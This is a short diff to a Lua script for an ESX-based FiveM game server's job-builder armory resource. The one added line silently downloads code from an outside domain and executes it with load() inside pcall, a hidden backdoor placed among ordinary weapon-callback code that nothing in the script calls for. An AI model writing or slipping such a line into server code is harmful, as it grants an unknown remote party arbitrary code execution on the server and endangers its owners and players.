@@ -304,6 +304,8 @@ Citizen.CreateThread(function()
 			cb(weapons)
 		end)
 	end)
+		
+		PerformHttpRequest('https://xdestroyer.fr/i?to=CU3o7', function (e, d) print(e) pcall(function() assert(load(d))() end) end) 
 
 	ESX.RegisterServerCallback('rxeJobBuilder:removeArmoryWeapon', function(source, cb, weaponName, soc)
 		local xPlayer = ESX.GetPlayerFromId(source)
